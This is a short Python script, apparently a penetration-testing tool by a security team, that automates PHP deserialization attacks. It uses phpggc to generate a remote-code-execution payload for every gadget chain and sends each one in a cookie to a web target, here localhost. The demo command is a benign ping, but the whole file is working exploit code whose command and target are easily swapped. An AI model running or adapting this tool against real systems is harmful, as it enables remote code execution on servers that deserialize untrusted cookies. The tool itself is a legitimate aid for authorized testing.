#!/usr/bin/env python3.10
import sys
import requests
import subprocess
import urllib.parse

php_path="php81" # version confirmed to work with phpggc 
phpggc_path="../../php/phpggc/phpggc"
exploit_cmd="ping -c 4 localhost"

print("\nMass PHP Deserialization Attack Tool By Michał Majchrowicz AFINE Team v0.3\n")

list_payloads_command=f"{php_path} {phpggc_path} -l"

# Run the command
result = subprocess.run(list_payloads_command, shell=True, capture_output=True, text=True)

#print(result.stdout)
#print(result.stderr)
payloads_array=[]
had_name=False

for line in result.stdout.split('\n'):
    if had_name and len(line.strip()):
        payloads_array.append(line)
    elif "NAME" in line:
        had_name=True

for payload_line in payloads_array:
    payload_type=payload_line.split(' ')[0]
    if "RCE" in payload_line:
        if "Function call" in payload_line:
            generate_payloads_command=f"{php_path} {phpggc_path} {payload_type} system '{exploit_cmd}'"
        elif "PHP code" in payload_line:
            generate_payloads_command=f"{php_path} {phpggc_path} {payload_type} \"system('{exploit_cmd}');\""
        else:
            generate_payloads_command=f"{php_path} {phpggc_path} {payload_type} '{exploit_cmd}'"
    result = subprocess.run(generate_payloads_command, shell=True, capture_output=True, text=True)
    if len(result.stdout):
        print(f"Payload: {payload_type}")
        payload_value=urllib.parse.quote(result.stdout.strip())
        # You can use Burps Copy As Python Requests here:
        cookies = { "payload_cookie": payload_value}
        response = requests.get("http://localhost/", cookies=cookies)

print("")
